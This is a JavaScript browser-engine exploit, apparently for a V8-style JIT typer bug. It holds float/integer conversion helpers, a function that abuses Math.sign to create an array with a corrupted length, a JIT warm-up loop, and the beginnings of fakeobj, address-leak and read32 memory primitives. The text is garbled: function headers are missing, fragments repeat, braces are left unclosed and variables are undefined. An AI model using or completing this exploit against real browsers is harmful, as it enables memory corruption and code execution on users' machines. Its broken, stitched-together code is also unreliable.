function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function foo(a) {
  var y = 0x7fffffff;

  if (a == NaN) y = NaN;
  if (a) y = -1;

  let z = y + 1;
  z >>= 31;
  z = 0x80000000 - Math.sign(z|1);

  if(a) z = 0;

  var arr = new Array(0-Math.sign(z));
  arr.shift();
  var cor = [1.1, 1.2, 1.3];

  return [arr, cor];
}

for(var i=0;i<0x3000;++i)
    foo(true);

var x = foo(false);

    arr[idx+1] = k;
    return ftoi(cor[0]) & 0xffffffffn;

function fakeobj(k) {
    cor[0] = itof(k);
    return arr[idx+1];

    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    return (fake[0]);

function read32(addr) {
    if (addr % 2n == 0n) addr += 1n;
    arr2[1] = itof((2n << 32n) + addr - 8n);
    f64_buf[0] = fake[0];
    const lo = BigInt(u64_buf[0]);
    return lo;
}

    if (addr % 2n == 0) {

    arr2[1] = itof((2n << 32n) + addr - 8n);
